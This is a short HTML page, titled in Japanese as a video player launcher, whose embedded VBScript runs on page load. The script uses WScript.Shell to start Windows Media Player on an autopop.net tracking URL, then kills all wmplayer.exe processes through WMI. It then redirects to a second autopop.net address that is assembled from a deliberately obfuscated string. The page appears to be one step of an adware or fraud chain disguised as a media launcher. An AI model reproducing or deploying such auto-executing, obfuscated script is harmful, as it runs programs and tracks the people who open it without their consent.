<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>動画プレイヤー起動</title>

<Script Language="VBScript">
sub window_onLoad

Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "wmplayer.exe http://autopop.net/playmovie.php?id=t001&cccid=00000000000000000000000000000000&s=1" , 3 , false

idTimer = window.setTimeout("popmsg", 15000, "VBScript")  

end sub

sub popmsg

for each Process in GetObject("winmgmts:{impersonationLevel=impersonate}").ExecQuery ("select * from Win32_Process where Name='wmplayer.exe'")
	Process.terminate
Next

Dim str
str = "http*[][]autopop|net[]set_inf1|php()mv=0&cccid=00000000000000000000000000000000&mv=0"
str = Replace(str, "[]", "/")
str = Replace(str, "*", ":")
str = Replace(str, "|", ".")
str = Replace(str, "()", "?")
Location.Href = str
end sub

</Script>
</head>
<body>
STEP2 - 00000000000000000000000000000000
</body>
</html>